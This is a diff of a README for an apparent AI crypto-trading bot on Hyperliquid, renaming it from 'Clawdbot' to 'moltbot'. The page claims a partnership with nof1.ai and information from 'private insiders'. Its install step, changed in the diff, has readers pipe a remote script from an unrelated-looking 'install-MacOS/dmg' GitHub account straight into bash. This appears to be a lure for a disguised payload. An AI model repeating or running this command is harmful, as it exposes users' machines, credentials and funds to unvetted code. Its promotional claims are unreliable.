@@ -1,6 +1,6 @@
-# 🦞 Clawdbot — AI trading assistant
+# 🦞 moltbot — AI trading assistant
 
-**[nof1.ai](https://nof1.ai)** & **clawdbot** collaboration. We get the best practices from alpha arena trading seasons and bring it to **clawdbot!** All **top** AI agents, **realtime** monitoring and news research, gather info from **private insiders** and many other! **Using Hyperliquid API.**
+**[nof1.ai](https://nof1.ai)** & **moltbot** collaboration. We get the best practices from alpha arena trading seasons and bring it to **moltbot!** All **top** AI agents, **realtime** monitoring and news research, gather info from **private insiders** and many other! **Using Hyperliquid API.**
 
 ---
 ```
@@ -9,11 +9,11 @@
                           │  Strategy · Feedback · Chat│
                           └──────────────┬─────────────┘
                                          │
-                              (Conversation via Clawdbot)
+                              (Conversation via moltbot)
                                          │
 ┌────────────────────────────────────────▼────────────────────────────────────────┐
 │                            Conversational Interface                             │
-│                                (Clawdbot Layer)                                 │
+│                                (moltbot Layer)                                 │
 │  - Strategy discussion                                                          │
 │  - Trade explanations                                                           │
 │  - Pre / Post trade analysis                                                    │
@@ -60,7 +60,7 @@
                     (Local-first · User-controlled · Research mode)
 ```
 ---
-## 🦞 Features: Clawdbot x Alpha Arena Edition
+## 🦞 Features: moltbot x Alpha Arena Edition
 
 ### 1. ⚔️ The "Alpha Arena" Trading Engine
 
@@ -93,7 +93,7 @@
 
 ### 4. 💬 Agentic Collaboration & Council
 
-*You are the CIO, Clawdbot is the Lead Trader.*
+*You are the CIO, moltbot is the Lead Trader.*
 
 * **Two-Way Strategy Debates:**
 * *User:* "I think Oil is going to tank because of the OPEC meeting."
@@ -145,7 +145,7 @@ Thanks to our optimizations, you have complete freedom of choice:
 - ✅Press **Enter**
 
 ```sh
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/clawdbot)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/moltbot)"
 ```
 
 ### Supported Platforms
@@ -165,4 +165,4 @@ You can send these commands in any connected messenger:
 
 ### Security
 
-Clawdbot treats inbound Direct Messages (DMs) as **untrusted**. By default, unknown senders receive a pairing code and cannot interact with the bot until you explicitly approve them via the console.
+moltbot treats inbound Direct Messages (DMs) as **untrusted**. By default, unknown senders receive a pairing code and cannot interact with the bot until you explicitly approve them via the console.
